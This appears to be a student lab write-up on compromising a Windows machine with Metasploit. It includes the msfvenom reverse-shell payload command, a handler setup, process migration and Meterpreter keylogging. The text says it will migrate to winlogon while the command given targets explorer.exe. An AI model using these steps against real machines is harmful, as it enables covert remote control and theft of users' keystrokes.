# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="765" height="274" alt="image" src="https://github.com/user-attachments/assets/a37fe0fb-ec3f-459e-b39f-fd8ab2a0df2b" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="601" height="111" alt="image" src="https://github.com/user-attachments/assets/7f243e5a-e958-4446-91d6-3cadb7a4a1e7" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="275" height="51" alt="image" src="https://github.com/user-attachments/assets/99e67c1f-3de7-4d71-9d89-5c392d69222f" />
Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="257" height="34" alt="ep 6 3" src="https://github.com/user-attachments/assets/1a7a419f-56b8-4cac-afe0-ac4926dfc5a5" />

Check the status of apache2
## OUTPUT:
<img width="538" height="383" alt="image" src="https://github.com/user-attachments/assets/a7b92aba-ad89-4f1b-91d0-83cb8031422b" />

Invoke msfconsole:
## OUTPUT:
<img width="550" height="485" alt="image" src="https://github.com/user-attachments/assets/c33c9285-b3d0-41b0-b56b-d3c92fda2c09" />
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="727" height="602" alt="help" src="https://github.com/user-attachments/assets/fa1ee9f8-e397-4c6d-ac2e-d6166930010c" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="857" height="647" alt="Screenshot 2026-09-02 124646" src="https://github.com/user-attachments/assets/e4677982-57fa-441d-9aca-f72b464bec88" />
Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="830" height="498" alt="image" src="https://github.com/user-attachments/assets/6e610087-0a17-459e-8cbe-4c845ea8c971" />

On kali/parrot give the command exploit
## OUTPUT:
<img width="425" height="36" alt="mutli" src="https://github.com/user-attachments/assets/834cc045-1a8a-4596-b018-d8f72d0b9e8b" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="582" height="326" alt="image" src="https://github.com/user-attachments/assets/03491d97-c925-4283-9219-fb91bd5f2da5" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="610" height="414" alt="net" src="https://github.com/user-attachments/assets/74a9f3b4-5605-412e-b33d-a6f475c030dd" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="598" height="131" alt="key" src="https://github.com/user-attachments/assets/fa42af12-2f8d-4282-8569-af01cf1aad8a" />

keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="566" height="178" alt="keycan" src="https://github.com/user-attachments/assets/f73df571-a3cd-4448-87de-0e20679ad31b" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
